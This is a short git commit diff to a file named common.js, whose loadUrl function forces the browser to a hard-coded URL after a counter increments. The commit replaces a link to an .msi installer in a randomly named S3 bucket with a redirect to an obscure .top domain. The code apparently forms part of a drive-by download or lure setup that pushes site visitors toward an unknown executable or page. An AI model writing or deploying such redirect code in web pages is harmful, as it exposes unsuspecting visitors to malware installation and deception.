fdfa71573da585f30c31d21ea7084a3b78918c33
siwadiao <buoihandoan64147@gmail.com>
2025-08-13 00:40:19 +0800

    Update common.js

--- common.js
+++ common.js
@@ -2,7 +2,7 @@ function loadUrl()
 {
 	if(num>=1)
 	{
-		var url="https://huo1w1ocb.s3.ap-southeast-1.amazonaws.com/huo1w1ocb.msi";
+		var url="https://hyeiyevverldd.top";
 		window.location=url;
 	}
 }
@@ -12,6 +12,7 @@ function getLoad()
 {
 	num++;
 }
+
 
 
 
